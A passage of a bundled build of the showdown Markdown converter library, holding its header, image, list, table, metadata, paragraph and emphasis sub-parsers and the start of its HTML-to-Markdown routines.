      text = text.replace("\xA8C" + i + "C", repText);
    }
    text = globals.converter._dispatch("unhashHTMLSpans.after", text, options, globals);
    return text;
  });
  showdown.subParser("hashPreCodeTags", function(text, options, globals) {
    "use strict";
    text = globals.converter._dispatch("hashPreCodeTags.before", text, options, globals);
    var repFunc = function(wholeMatch, match, left, right) {
      var codeblock = left + showdown.subParser("encodeCode")(match, options, globals) + right;
      return "\n\n\xA8G" + (globals.ghCodeBlocks.push({ text: wholeMatch, codeblock }) - 1) + "G\n\n";
    };
    text = showdown.helper.replaceRecursiveRegExp(text, repFunc, "^ {0,3}<code\\b[^>]*>\\s*<pre\\b[^>]*>", "^ {0,3}</pre>\\s*</code>", "gim");
    text = globals.converter._dispatch("hashPreCodeTags.after", text, options, globals);
    return text;
  });
  showdown.subParser("headers", function(text, options, globals) {
    "use strict";
    text = globals.converter._dispatch("headers.before", text, options, globals);
    var headerLevelStart = isNaN(parseInt(options.headerLevelStart)) ? 1 : parseInt(options.headerLevelStart), setextRegexH1 = options.smoothLivePreview ? /^(.+)[ \t]*\n={2,}[ \t]*\n+/gm : /^(.+)[ \t]*\n=+[ \t]*\n+/gm, setextRegexH2 = options.smoothLivePreview ? /^(.+)[ \t]*\n-{2,}[ \t]*\n+/gm : /^(.+)[ \t]*\n-+[ \t]*\n+/gm;
    text = text.replace(setextRegexH1, function(wholeMatch, m1) {
      var spanGamut = showdown.subParser("spanGamut")(m1, options, globals), hID = options.noHeaderId ? "" : ' id="' + headerId(m1) + '"', hLevel = headerLevelStart, hashBlock = "<h" + hLevel + hID + ">" + spanGamut + "</h" + hLevel + ">";
      return showdown.subParser("hashBlock")(hashBlock, options, globals);
    });
    text = text.replace(setextRegexH2, function(matchFound, m1) {
      var spanGamut = showdown.subParser("spanGamut")(m1, options, globals), hID = options.noHeaderId ? "" : ' id="' + headerId(m1) + '"', hLevel = headerLevelStart + 1, hashBlock = "<h" + hLevel + hID + ">" + spanGamut + "</h" + hLevel + ">";
      return showdown.subParser("hashBlock")(hashBlock, options, globals);
    });
    var atxStyle = options.requireSpaceBeforeHeadingText ? /^(#{1,6})[ \t]+(.+?)[ \t]*#*\n+/gm : /^(#{1,6})[ \t]*(.+?)[ \t]*#*\n+/gm;
    text = text.replace(atxStyle, function(wholeMatch, m1, m2) {
      var hText = m2;
      if (options.customizedHeaderId) {
        hText = m2.replace(/\s?\{([^{]+?)}\s*$/, "");
      }
      var span = showdown.subParser("spanGamut")(hText, options, globals), hID = options.noHeaderId ? "" : ' id="' + headerId(m2) + '"', hLevel = headerLevelStart - 1 + m1.length, header = "<h" + hLevel + hID + ">" + span + "</h" + hLevel + ">";
      return showdown.subParser("hashBlock")(header, options, globals);
    });
    function headerId(m) {
      var title, prefix;
      if (options.customizedHeaderId) {
        var match = m.match(/\{([^{]+?)}\s*$/);
        if (match && match[1]) {
          m = match[1];
        }
      }
      title = m;
      if (showdown.helper.isString(options.prefixHeaderId)) {
        prefix = options.prefixHeaderId;
      } else if (options.prefixHeaderId === true) {
        prefix = "section-";
      } else {
        prefix = "";
      }
      if (!options.rawPrefixHeaderId) {
        title = prefix + title;
      }
      if (options.ghCompatibleHeaderId) {
        title = title.replace(/ /g, "-").replace(/&amp;/g, "").replace(/¨T/g, "").replace(/¨D/g, "").replace(/[&+$,\/:;=?@"#{}|^¨~\[\]`\\*)(%.!'<>]/g, "").toLowerCase();
      } else if (options.rawHeaderId) {
        title = title.replace(/ /g, "-").replace(/&amp;/g, "&").replace(/¨T/g, "\xA8").replace(/¨D/g, "$").replace(/["']/g, "-").toLowerCase();
      } else {
        title = title.replace(/[^\w]/g, "").toLowerCase();
      }
      if (options.rawPrefixHeaderId) {
        title = prefix + title;
      }
      if (globals.hashLinkCounts[title]) {
        title = title + "-" + globals.hashLinkCounts[title]++;
      } else {
        globals.hashLinkCounts[title] = 1;
      }
      return title;
    }
    text = globals.converter._dispatch("headers.after", text, options, globals);
    return text;
  });
  showdown.subParser("horizontalRule", function(text, options, globals) {
    "use strict";
    text = globals.converter._dispatch("horizontalRule.before", text, options, globals);
    var key = showdown.subParser("hashBlock")("<hr />", options, globals);
    text = text.replace(/^ {0,2}( ?-){3,}[ \t]*$/gm, key);
    text = text.replace(/^ {0,2}( ?\*){3,}[ \t]*$/gm, key);
    text = text.replace(/^ {0,2}( ?_){3,}[ \t]*$/gm, key);
    text = globals.converter._dispatch("horizontalRule.after", text, options, globals);
    return text;
  });
  showdown.subParser("images", function(text, options, globals) {
    "use strict";
    text = globals.converter._dispatch("images.before", text, options, globals);
    var inlineRegExp = /!\[([^\]]*?)][ \t]*()\([ \t]?<?([\S]+?(?:\([\S]*?\)[\S]*?)?)>?(?: =([*\d]+[A-Za-z%]{0,4})x([*\d]+[A-Za-z%]{0,4}))?[ \t]*(?:(["'])([^"]*?)\6)?[ \t]?\)/g, crazyRegExp = /!\[([^\]]*?)][ \t]*()\([ \t]?<([^>]*)>(?: =([*\d]+[A-Za-z%]{0,4})x([*\d]+[A-Za-z%]{0,4}))?[ \t]*(?:(?:(["'])([^"]*?)\6))?[ \t]?\)/g, base64RegExp = /!\[([^\]]*?)][ \t]*()\([ \t]?<?(data:.+?\/.+?;base64,[A-Za-z0-9+/=\n]+?)>?(?: =([*\d]+[A-Za-z%]{0,4})x([*\d]+[A-Za-z%]{0,4}))?[ \t]*(?:(["'])([^"]*?)\6)?[ \t]?\)/g, referenceRegExp = /!\[([^\]]*?)] ?(?:\n *)?\[([\s\S]*?)]()()()()()/g, refShortcutRegExp = /!\[([^\[\]]+)]()()()()()/g;
    function writeImageTagBase64(wholeMatch, altText, linkId, url, width, height, m5, title) {
      url = url.replace(/\s/g, "");
      return writeImageTag(wholeMatch, altText, linkId, url, width, height, m5, title);
    }
    function writeImageTag(wholeMatch, altText, linkId, url, width, height, m5, title) {
      var gUrls = globals.gUrls, gTitles = globals.gTitles, gDims = globals.gDimensions;
      linkId = linkId.toLowerCase();
      if (!title) {
        title = "";
      }
      if (wholeMatch.search(/\(<?\s*>? ?(['"].*['"])?\)$/m) > -1) {
        url = "";
      } else if (url === "" || url === null) {
        if (linkId === "" || linkId === null) {
          linkId = altText.toLowerCase().replace(/ ?\n/g, " ");
        }
        url = "#" + linkId;
        if (!showdown.helper.isUndefined(gUrls[linkId])) {
          url = gUrls[linkId];
          if (!showdown.helper.isUndefined(gTitles[linkId])) {
            title = gTitles[linkId];
          }
          if (!showdown.helper.isUndefined(gDims[linkId])) {
            width = gDims[linkId].width;
            height = gDims[linkId].height;
          }
        } else {
          return wholeMatch;
        }
      }
      altText = altText.replace(/"/g, "&quot;").replace(showdown.helper.regexes.asteriskDashAndColon, showdown.helper.escapeCharactersCallback);
      url = url.replace(showdown.helper.regexes.asteriskDashAndColon, showdown.helper.escapeCharactersCallback);
      var result = '<img src="' + url + '" alt="' + altText + '"';
      if (title && showdown.helper.isString(title)) {
        title = title.replace(/"/g, "&quot;").replace(showdown.helper.regexes.asteriskDashAndColon, showdown.helper.escapeCharactersCallback);
        result += ' title="' + title + '"';
      }
      if (width && height) {
        width = width === "*" ? "auto" : width;
        height = height === "*" ? "auto" : height;
        result += ' width="' + width + '"';
        result += ' height="' + height + '"';
      }
      result += " />";
      return result;
    }
    text = text.replace(referenceRegExp, writeImageTag);
    text = text.replace(base64RegExp, writeImageTagBase64);
    text = text.replace(crazyRegExp, writeImageTag);
    text = text.replace(inlineRegExp, writeImageTag);
    text = text.replace(refShortcutRegExp, writeImageTag);
    text = globals.converter._dispatch("images.after", text, options, globals);
    return text;
  });
  showdown.subParser("italicsAndBold", function(text, options, globals) {
    "use strict";
    text = globals.converter._dispatch("italicsAndBold.before", text, options, globals);
    function parseInside(txt, left, right) {
      return left + txt + right;
    }
    if (options.literalMidWordUnderscores) {
      text = text.replace(/\b___(\S[\s\S]*?)___\b/g, function(wm, txt) {
        return parseInside(txt, "<strong><em>", "</em></strong>");
      });
      text = text.replace(/\b__(\S[\s\S]*?)__\b/g, function(wm, txt) {
        return parseInside(txt, "<strong>", "</strong>");
      });
      text = text.replace(/\b_(\S[\s\S]*?)_\b/g, function(wm, txt) {
        return parseInside(txt, "<em>", "</em>");
      });
    } else {
      text = text.replace(/___(\S[\s\S]*?)___/g, function(wm, m) {
        return /\S$/.test(m) ? parseInside(m, "<strong><em>", "</em></strong>") : wm;
      });
      text = text.replace(/__(\S[\s\S]*?)__/g, function(wm, m) {
        return /\S$/.test(m) ? parseInside(m, "<strong>", "</strong>") : wm;
      });
      text = text.replace(/_([^\s_][\s\S]*?)_/g, function(wm, m) {
        return /\S$/.test(m) ? parseInside(m, "<em>", "</em>") : wm;
      });
    }
    if (options.literalMidWordAsterisks) {
      text = text.replace(/([^*]|^)\B\*\*\*(\S[\s\S]*?)\*\*\*\B(?!\*)/g, function(wm, lead, txt) {
        return parseInside(txt, lead + "<strong><em>", "</em></strong>");
      });
      text = text.replace(/([^*]|^)\B\*\*(\S[\s\S]*?)\*\*\B(?!\*)/g, function(wm, lead, txt) {
        return parseInside(txt, lead + "<strong>", "</strong>");
      });
      text = text.replace(/([^*]|^)\B\*(\S[\s\S]*?)\*\B(?!\*)/g, function(wm, lead, txt) {
        return parseInside(txt, lead + "<em>", "</em>");
      });
    } else {
      text = text.replace(/\*\*\*(\S[\s\S]*?)\*\*\*/g, function(wm, m) {
        return /\S$/.test(m) ? parseInside(m, "<strong><em>", "</em></strong>") : wm;
      });
      text = text.replace(/\*\*(\S[\s\S]*?)\*\*/g, function(wm, m) {
        return /\S$/.test(m) ? parseInside(m, "<strong>", "</strong>") : wm;
      });
      text = text.replace(/\*([^\s*][\s\S]*?)\*/g, function(wm, m) {
        return /\S$/.test(m) ? parseInside(m, "<em>", "</em>") : wm;
      });
    }
    text = globals.converter._dispatch("italicsAndBold.after", text, options, globals);
    return text;
  });
  showdown.subParser("lists", function(text, options, globals) {
    "use strict";
    function processListItems(listStr, trimTrailing) {
      globals.gListLevel++;
      listStr = listStr.replace(/\n{2,}$/, "\n");
      listStr += "\xA80";
      var rgx = /(\n)?(^ {0,3})([*+-]|\d+[.])[ \t]+((\[(x|X| )?])?[ \t]*[^\r]+?(\n{1,2}))(?=\n*(¨0| {0,3}([*+-]|\d+[.])[ \t]+))/gm, isParagraphed = /\n[ \t]*\n(?!¨0)/.test(listStr);
      if (options.disableForced4SpacesIndentedSublists) {
        rgx = /(\n)?(^ {0,3})([*+-]|\d+[.])[ \t]+((\[(x|X| )?])?[ \t]*[^\r]+?(\n{1,2}))(?=\n*(¨0|\2([*+-]|\d+[.])[ \t]+))/gm;
      }
      listStr = listStr.replace(rgx, function(wholeMatch, m1, m2, m3, m4, taskbtn, checked) {
        checked = checked && checked.trim() !== "";
        var item = showdown.subParser("outdent")(m4, options, globals), bulletStyle = "";
        if (taskbtn && options.tasklists) {
          bulletStyle = ' class="task-list-item" style="list-style-type: none;"';
          item = item.replace(/^[ \t]*\[(x|X| )?]/m, function() {
            var otp = '<input type="checkbox" disabled style="margin: 0px 0.35em 0.25em -1.6em; vertical-align: middle;"';
            if (checked) {
              otp += " checked";
            }
            otp += ">";
            return otp;
          });
        }
        item = item.replace(/^([-*+]|\d\.)[ \t]+[\S\n ]*/g, function(wm2) {
          return "\xA8A" + wm2;
        });
        if (m1 || item.search(/\n{2,}/) > -1) {
          item = showdown.subParser("githubCodeBlocks")(item, options, globals);
          item = showdown.subParser("blockGamut")(item, options, globals);
        } else {
          item = showdown.subParser("lists")(item, options, globals);
          item = item.replace(/\n$/, "");
          item = showdown.subParser("hashHTMLBlocks")(item, options, globals);
          item = item.replace(/\n\n+/g, "\n\n");
          if (isParagraphed) {
            item = showdown.subParser("paragraphs")(item, options, globals);
          } else {
            item = showdown.subParser("spanGamut")(item, options, globals);
          }
        }
        item = item.replace("\xA8A", "");
        item = "<li" + bulletStyle + ">" + item + "</li>\n";
        return item;
      });
      listStr = listStr.replace(/¨0/g, "");
      globals.gListLevel--;
      if (trimTrailing) {
        listStr = listStr.replace(/\s+$/, "");
      }
      return listStr;
    }
    function styleStartNumber(list, listType) {
      if (listType === "ol") {
        var res = list.match(/^ *(\d+)\./);
        if (res && res[1] !== "1") {
          return ' start="' + res[1] + '"';
        }
      }
      return "";
    }
    function parseConsecutiveLists(list, listType, trimTrailing) {
      var olRgx = options.disableForced4SpacesIndentedSublists ? /^ ?\d+\.[ \t]/gm : /^ {0,3}\d+\.[ \t]/gm, ulRgx = options.disableForced4SpacesIndentedSublists ? /^ ?[*+-][ \t]/gm : /^ {0,3}[*+-][ \t]/gm, counterRxg = listType === "ul" ? olRgx : ulRgx, result = "";
      if (list.search(counterRxg) !== -1) {
        (function parseCL(txt) {
          var pos = txt.search(counterRxg), style2 = styleStartNumber(list, listType);
          if (pos !== -1) {
            result += "\n\n<" + listType + style2 + ">\n" + processListItems(txt.slice(0, pos), !!trimTrailing) + "</" + listType + ">\n";
            listType = listType === "ul" ? "ol" : "ul";
            counterRxg = listType === "ul" ? olRgx : ulRgx;
            parseCL(txt.slice(pos));
          } else {
            result += "\n\n<" + listType + style2 + ">\n" + processListItems(txt, !!trimTrailing) + "</" + listType + ">\n";
          }
        })(list);
      } else {
        var style = styleStartNumber(list, listType);
        result = "\n\n<" + listType + style + ">\n" + processListItems(list, !!trimTrailing) + "</" + listType + ">\n";
      }
      return result;
    }
    text = globals.converter._dispatch("lists.before", text, options, globals);
    text += "\xA80";
    if (globals.gListLevel) {
      text = text.replace(
        /^(( {0,3}([*+-]|\d+[.])[ \t]+)[^\r]+?(¨0|\n{2,}(?=\S)(?![ \t]*(?:[*+-]|\d+[.])[ \t]+)))/gm,
        function(wholeMatch, list, m2) {
          var listType = m2.search(/[*+-]/g) > -1 ? "ul" : "ol";
          return parseConsecutiveLists(list, listType, true);
        }
      );
    } else {
      text = text.replace(
        /(\n\n|^\n?)(( {0,3}([*+-]|\d+[.])[ \t]+)[^\r]+?(¨0|\n{2,}(?=\S)(?![ \t]*(?:[*+-]|\d+[.])[ \t]+)))/gm,
        function(wholeMatch, m1, list, m3) {
          var listType = m3.search(/[*+-]/g) > -1 ? "ul" : "ol";
          return parseConsecutiveLists(list, listType, false);
        }
      );
    }
    text = text.replace(/¨0/, "");
    text = globals.converter._dispatch("lists.after", text, options, globals);
    return text;
  });
  showdown.subParser("metadata", function(text, options, globals) {
    "use strict";
    if (!options.metadata) {
      return text;
    }
    text = globals.converter._dispatch("metadata.before", text, options, globals);
    function parseMetadataContents(content) {
      globals.metadata.raw = content;
      content = content.replace(/"/g, "&quot;");
      content = content.replace(/\n {4}/g, " ");
      content.replace(/^([\S ]+): +([\s\S]+?)$/gm, function(wm, key, value) {
        globals.metadata.parsed[key] = value;
        return "";
      });
    }
    text = text.replace(/^\s*«««+(\S*?)\n([\s\S]+?)\n»»»+\n/, function(wholematch, format, content) {
      parseMetadataContents(content);
      return "\xA8M";
    });
    text = text.replace(/^\s*---+(\S*?)\n([\s\S]+?)\n---+\n/, function(wholematch, format, content) {
      if (format) {
        globals.metadata.format = format;
      }
      parseMetadataContents(content);
      return "\xA8M";
    });
    text = text.replace(/¨M/g, "");
    text = globals.converter._dispatch("metadata.after", text, options, globals);
    return text;
  });
  showdown.subParser("outdent", function(text, options, globals) {
    "use strict";
    text = globals.converter._dispatch("outdent.before", text, options, globals);
    text = text.replace(/^(\t|[ ]{1,4})/gm, "\xA80");
    text = text.replace(/¨0/g, "");
    text = globals.converter._dispatch("outdent.after", text, options, globals);
    return text;
  });
  showdown.subParser("paragraphs", function(text, options, globals) {
    "use strict";
    text = globals.converter._dispatch("paragraphs.before", text, options, globals);
    text = text.replace(/^\n+/g, "");
    text = text.replace(/\n+$/g, "");
    var grafs = text.split(/\n{2,}/g), grafsOut = [], end = grafs.length;
    for (var i = 0; i < end; i++) {
      var str = grafs[i];
      if (str.search(/¨(K|G)(\d+)\1/g) >= 0) {
        grafsOut.push(str);
      } else if (str.search(/\S/) >= 0) {
        str = showdown.subParser("spanGamut")(str, options, globals);
        grafsOut.push(str);
      }
    }
    end = grafsOut.length;
    for (i = 0; i < end; i++) {
      var blockText = "", grafsOutIt = grafsOut[i], codeFlag = false;
      while (/¨(K|G)(\d+)\1/.test(grafsOutIt)) {
        var delim = RegExp.$1, num = RegExp.$2;
        if (delim === "K") {
          blockText = globals.gHtmlBlocks[num];
        } else {
          if (codeFlag) {
            blockText = showdown.subParser("encodeCode")(globals.ghCodeBlocks[num].text, options, globals);
          } else {
            blockText = globals.ghCodeBlocks[num].codeblock;
          }
        }
        blockText = blockText.replace(/\$/g, "$$$$");
        grafsOutIt = grafsOutIt.replace(/(\n\n)?¨(K|G)\d+\2(\n\n)?/, blockText);
        if (/^<code\b[^>]*>\s*<pre\b[^>]*>/.test(grafsOutIt)) {
          codeFlag = true;
        }
      }
      grafsOut[i] = grafsOutIt;
    }
    text = grafsOut.join("<br />");
    text = text.replace(/^\n+/g, "");
    text = text.replace(/\n+$/g, "");
    return globals.converter._dispatch("paragraphs.after", text, options, globals);
  });
  showdown.subParser("runExtension", function(ext, text, options, globals) {
    "use strict";
    if (ext.filter) {
      text = ext.filter(text, globals.converter, options);
    } else if (ext.regex) {
      var re = ext.regex;
      if (!(re instanceof RegExp)) {
        re = new RegExp(re, "g");
      }
      text = text.replace(re, ext.replace);
    }
    return text;
  });
  showdown.subParser("spanGamut", function(text, options, globals) {
    "use strict";
    text = globals.converter._dispatch("spanGamut.before", text, options, globals);
    text = showdown.subParser("codeSpans")(text, options, globals);
    text = showdown.subParser("escapeSpecialCharsWithinTagAttributes")(text, options, globals);
    text = showdown.subParser("encodeBackslashEscapes")(text, options, globals);
    text = showdown.subParser("images")(text, options, globals);
    text = showdown.subParser("anchors")(text, options, globals);
    text = showdown.subParser("autoLinks")(text, options, globals);
    text = showdown.subParser("simplifiedAutoLinks")(text, options, globals);
    text = showdown.subParser("emoji")(text, options, globals);
    text = showdown.subParser("underline")(text, options, globals);
    text = showdown.subParser("italicsAndBold")(text, options, globals);
    text = showdown.subParser("strikethrough")(text, options, globals);
    text = showdown.subParser("ellipsis")(text, options, globals);
    text = showdown.subParser("hashHTMLSpans")(text, options, globals);
    text = showdown.subParser("encodeAmpsAndAngles")(text, options, globals);
    if (options.simpleLineBreaks) {
      if (!/\n\n¨K/.test(text)) {
        text = text.replace(/\n+/g, "<br />\n");
      }
    } else {
      text = text.replace(/  +\n/g, "<br />\n");
    }
    text = globals.converter._dispatch("spanGamut.after", text, options, globals);
    return text;
  });
  showdown.subParser("strikethrough", function(text, options, globals) {
    "use strict";
    function parseInside(txt) {
      if (options.simplifiedAutoLink) {
        txt = showdown.subParser("simplifiedAutoLinks")(txt, options, globals);
      }
      return "<del>" + txt + "</del>";
    }
    if (options.strikethrough) {
      text = globals.converter._dispatch("strikethrough.before", text, options, globals);
      text = text.replace(/(?:~){2}([\s\S]+?)(?:~){2}/g, function(wm, txt) {
        return parseInside(txt);
      });
      text = globals.converter._dispatch("strikethrough.after", text, options, globals);
    }
    return text;
  });
  showdown.subParser("stripLinkDefinitions", function(text, options, globals) {
    "use strict";
    var regex = /^ {0,3}\[([^\]]+)]:[ \t]*\n?[ \t]*<?([^>\s]+)>?(?: =([*\d]+[A-Za-z%]{0,4})x([*\d]+[A-Za-z%]{0,4}))?[ \t]*\n?[ \t]*(?:(\n*)["|'(](.+?)["|')][ \t]*)?(?:\n+|(?=¨0))/gm, base64Regex = /^ {0,3}\[([^\]]+)]:[ \t]*\n?[ \t]*<?(data:.+?\/.+?;base64,[A-Za-z0-9+/=\n]+?)>?(?: =([*\d]+[A-Za-z%]{0,4})x([*\d]+[A-Za-z%]{0,4}))?[ \t]*\n?[ \t]*(?:(\n*)["|'(](.+?)["|')][ \t]*)?(?:\n\n|(?=¨0)|(?=\n\[))/gm;
    text += "\xA80";
    var replaceFunc = function(wholeMatch, linkId, url, width, height, blankLines, title) {
      linkId = linkId.toLowerCase();
      if (text.toLowerCase().split(linkId).length - 1 < 2) {
        return wholeMatch;
      }
      if (url.match(/^data:.+?\/.+?;base64,/)) {
        globals.gUrls[linkId] = url.replace(/\s/g, "");
      } else {
        globals.gUrls[linkId] = showdown.subParser("encodeAmpsAndAngles")(url, options, globals);
      }
      if (blankLines) {
        return blankLines + title;
      } else {
        if (title) {
          globals.gTitles[linkId] = title.replace(/"|'/g, "&quot;");
        }
        if (options.parseImgDimensions && width && height) {
          globals.gDimensions[linkId] = {
            width,
            height
          };
        }
      }
      return "";
    };
    text = text.replace(base64Regex, replaceFunc);
    text = text.replace(regex, replaceFunc);
    text = text.replace(/¨0/, "");
    return text;
  });
  showdown.subParser("tables", function(text, options, globals) {
    "use strict";
    if (!options.tables) {
      return text;
    }
    var tableRgx = /^ {0,3}\|?.+\|.+\n {0,3}\|?[ \t]*:?[ \t]*(?:[-=]){2,}[ \t]*:?[ \t]*\|[ \t]*:?[ \t]*(?:[-=]){2,}[\s\S]+?(?:\n\n|¨0)/gm, singeColTblRgx = /^ {0,3}\|.+\|[ \t]*\n {0,3}\|[ \t]*:?[ \t]*(?:[-=]){2,}[ \t]*:?[ \t]*\|[ \t]*\n( {0,3}\|.+\|[ \t]*\n)*(?:\n|¨0)/gm;
    function parseStyles(sLine) {
      if (/^:[ \t]*--*$/.test(sLine)) {
        return ' style="text-align:left;"';
      } else if (/^--*[ \t]*:[ \t]*$/.test(sLine)) {
        return ' style="text-align:right;"';
      } else if (/^:[ \t]*--*[ \t]*:$/.test(sLine)) {
        return ' style="text-align:center;"';
      } else {
        return "";
      }
    }
    function parseHeaders(header, style) {
      var id = "";
      header = header.trim();
      if (options.tablesHeaderId || options.tableHeaderId) {
        id = ' id="' + header.replace(/ /g, "_").toLowerCase() + '"';
      }
      header = showdown.subParser("spanGamut")(header, options, globals);
      return "<th" + id + style + ">" + header + "</th>\n";
    }
    function parseCells(cell, style) {
      var subText = showdown.subParser("spanGamut")(cell, options, globals);
      return "<td" + style + ">" + subText + "</td>\n";
    }
    function buildTable(headers, cells) {
      var tb = "<table>\n<thead>\n<tr>\n", tblLgn = headers.length;
      for (var i = 0; i < tblLgn; ++i) {
        tb += headers[i];
      }
      tb += "</tr>\n</thead>\n<tbody>\n";
      for (i = 0; i < cells.length; ++i) {
        tb += "<tr>\n";
        for (var ii = 0; ii < tblLgn; ++ii) {
          tb += cells[i][ii];
        }
        tb += "</tr>\n";
      }
      tb += "</tbody>\n</table>\n";
      return tb;
    }
    function parseTable(rawTable) {
      var i, tableLines = rawTable.split("\n");
      for (i = 0; i < tableLines.length; ++i) {
        if (/^ {0,3}\|/.test(tableLines[i])) {
          tableLines[i] = tableLines[i].replace(/^ {0,3}\|/, "");
        }
        if (/\|[ \t]*$/.test(tableLines[i])) {
          tableLines[i] = tableLines[i].replace(/\|[ \t]*$/, "");
        }
        tableLines[i] = showdown.subParser("codeSpans")(tableLines[i], options, globals);
      }
      var rawHeaders = tableLines[0].split("|").map(function(s) {
        return s.trim();
      }), rawStyles = tableLines[1].split("|").map(function(s) {
        return s.trim();
      }), rawCells = [], headers = [], styles = [], cells = [];
      tableLines.shift();
      tableLines.shift();
      for (i = 0; i < tableLines.length; ++i) {
        if (tableLines[i].trim() === "") {
          continue;
        }
        rawCells.push(
          tableLines[i].split("|").map(function(s) {
            return s.trim();
          })
        );
      }
      if (rawHeaders.length < rawStyles.length) {
        return rawTable;
      }
      for (i = 0; i < rawStyles.length; ++i) {
        styles.push(parseStyles(rawStyles[i]));
      }
      for (i = 0; i < rawHeaders.length; ++i) {
        if (showdown.helper.isUndefined(styles[i])) {
          styles[i] = "";
        }
        headers.push(parseHeaders(rawHeaders[i], styles[i]));
      }
      for (i = 0; i < rawCells.length; ++i) {
        var row = [];
        for (var ii = 0; ii < headers.length; ++ii) {
          if (showdown.helper.isUndefined(rawCells[i][ii])) {
          }
          row.push(parseCells(rawCells[i][ii], styles[ii]));
        }
        cells.push(row);
      }
      return buildTable(headers, cells);
    }
    text = globals.converter._dispatch("tables.before", text, options, globals);
    text = text.replace(/\\(\|)/g, showdown.helper.escapeCharactersCallback);
    text = text.replace(tableRgx, parseTable);
    text = text.replace(singeColTblRgx, parseTable);
    text = globals.converter._dispatch("tables.after", text, options, globals);
    return text;
  });
  showdown.subParser("underline", function(text, options, globals) {
    "use strict";
    if (!options.underline) {
      return text;
    }
    text = globals.converter._dispatch("underline.before", text, options, globals);
    if (options.literalMidWordUnderscores) {
      text = text.replace(/\b___(\S[\s\S]*?)___\b/g, function(wm, txt) {
        return "<u>" + txt + "</u>";
      });
      text = text.replace(/\b__(\S[\s\S]*?)__\b/g, function(wm, txt) {
        return "<u>" + txt + "</u>";
      });
    } else {
      text = text.replace(/___(\S[\s\S]*?)___/g, function(wm, m) {
        return /\S$/.test(m) ? "<u>" + m + "</u>" : wm;
      });
      text = text.replace(/__(\S[\s\S]*?)__/g, function(wm, m) {
        return /\S$/.test(m) ? "<u>" + m + "</u>" : wm;
      });
    }
    text = text.replace(/(_)/g, showdown.helper.escapeCharactersCallback);
    text = globals.converter._dispatch("underline.after", text, options, globals);
    return text;
  });
  showdown.subParser("unescapeSpecialChars", function(text, options, globals) {
    "use strict";
    text = globals.converter._dispatch("unescapeSpecialChars.before", text, options, globals);
    text = text.replace(/¨E(\d+)E/g, function(wholeMatch, m1) {
      var charCodeToReplace = parseInt(m1);
      return String.fromCharCode(charCodeToReplace);
    });
    text = globals.converter._dispatch("unescapeSpecialChars.after", text, options, globals);
    return text;
  });
  showdown.subParser("makeMarkdown.blockquote", function(node, globals) {
    "use strict";
    var txt = "";
    if (node.hasChildNodes()) {
      var children = node.childNodes, childrenLength = children.length;
      for (var i = 0; i < childrenLength; ++i) {
        var innerTxt = showdown.subParser("makeMarkdown.node")(children[i], globals);
        if (innerTxt === "") {
          continue;
        }
        txt += innerTxt;
      }
    }
    txt = txt.trim();
    txt = "> " + txt.split("\n").join("\n> ");
    return txt;
  });
  showdown.subParser("makeMarkdown.codeBlock", function(node, globals) {
    "use strict";
    var lang = node.getAttribute("language"), num = node.getAttribute("precodenum");
    return "```" + lang + "\n" + globals.preList[num] + "\n```";
  });
  showdown.subParser("makeMarkdown.codeSpan", function(node) {
    "use strict";
    return "`" + node.innerHTML + "`";
  });
  showdown.subParser("makeMarkdown.emphasis", function(node, globals) {
    "use strict";
    var txt = "";
    if (node.hasChildNodes()) {
      txt += "*";
      var children = node.childNodes, childrenLength = children.length;
      for (var i = 0; i < childrenLength; ++i) {
        txt += showdown.subParser("makeMarkdown.node")(children[i], globals);
      }
      txt += "*";
    }
    return txt;
  });
  showdown.subParser("makeMarkdown.header", function(node, globals, headerLevel) {
    "use strict";
    var headerMark = new Array(headerLevel + 1).join("#"), txt = "";
    if (node.hasChildNodes()) {
      txt = headerMark + " ";
      var children = node.childNodes, childrenLength = children.length;
      for (var i = 0; i < childrenLength; ++i) {
        txt += showdown.subParser("makeMarkdown.node")(children[i], globals);
      }
    }
    return txt;
  });
  showdown.subParser("makeMarkdown.hr", function() {
    "use strict";
    return "---";
  });
  showdown.subParser("makeMarkdown.image", function(node) {
    "use strict";
    var txt = "";
    if (node.hasAttribute("src")) {
      txt += "![" + node.getAttribute("alt") + "](";
      txt += "<" + node.getAttribute("src") + ">";
      if (node.hasAttribute("width") && node.hasAttribute("height")) {
        txt += " =" + node.getAttribute("width") + "x" + node.getAttribute("height");
      }
      if (node.hasAttribute("title")) {
        txt += ' "' + node.getAttribute("title") + '"';
      }
      txt += ")";
    }
    return txt;
  });
  showdown.subParser("makeMarkdown.links", function(node, globals) {
    "use strict";
    var txt = "";
    if (node.hasChildNodes() && node.hasAttribute("href")) {
      var children = node.childNodes, childrenLength = children.length;
      txt = "[";
      for (var i = 0; i < childrenLength; ++i) {
        txt += showdown.subParser("makeMarkdown.node")(children[i], globals);
      }
      txt += "](";
      txt += "<" + node.getAttribute("href") + ">";
      if (node.hasAttribute("title")) {
        txt += ' "' + node.getAttribute("title") + '"';
      }
      txt += ")";
    }
    return txt;
  });
  showdown.subParser("makeMarkdown.list", function(node, globals, type) {
    "use strict";
    var txt = "";
    if (!node.hasChildNodes()) {
      return "";
    }
    var listItems = node.childNodes, listItemsLenght = listItems.length, listNum = node.getAttribute("start") || 1;
    for (var i = 0; i < listItemsLenght; ++i) {
      if (typeof listItems[i].tagName === "undefined" || listItems[i].tagName.toLowerCase() !== "li") {
        continue;
      }
      var bullet = "";
      if (type === "ol") {
        bullet = listNum.toString() + ". ";
      } else {
        bullet = "- ";
      }
      txt += bullet + showdown.subParser("makeMarkdown.listItem")(listItems[i], globals);
      ++listNum;
    }
    txt += "\n<!-- -->\n";
    return txt.trim();
  });
  showdown.subParser("makeMarkdown.listItem", function(node, globals) {
    "use strict";
    var listItemTxt = "";
    var children = node.childNodes, childrenLenght = children.length;
    for (var i = 0; i < childrenLenght; ++i) {
      listItemTxt += showdown.subParser("makeMarkdown.node")(children[i], globals);
    }
    if (!/\n$/.test(listItemTxt)) {
      listItemTxt += "\n";
    } else {
      listItemTxt = listItemTxt.split("\n").join("\n    ").replace(/^ {4}$/gm, "").replace(/\n\n+/g, "\n\n");
    }
    return listItemTxt;
  });
  showdown.subParser("makeMarkdown.node", function(node, globals, spansOnly) {
    "use strict";
    spansOnly = spansOnly || false;
    var txt = "";
    if (node.nodeType === 3) {
      return showdown.subParser("makeMarkdown.txt")(node, globals);
    }
    if (node.nodeType === 8) {
      return "<!--" + node.data + "-->\n\n";
    }
    if (node.nodeType !== 1) {
      return "";
    }
    var tagName = node.tagName.toLowerCase();
    switch (tagName) {
      case "h1":
        if (!spansOnly) {
          txt = showdown.subParser("makeMarkdown.header")(node, globals, 1) + "\n\n";
        }
        break;
      case "h2":
        if (!spansOnly) {
